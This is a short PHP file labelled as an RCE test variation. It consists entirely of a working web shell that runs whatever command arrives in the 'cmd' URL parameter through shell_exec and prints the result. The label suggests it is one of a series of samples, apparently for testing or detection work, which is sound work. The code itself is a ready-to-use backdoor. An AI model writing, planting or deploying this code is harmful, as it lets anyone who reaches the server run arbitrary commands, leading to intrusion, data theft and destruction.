<?php
// RCE test variation #503
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>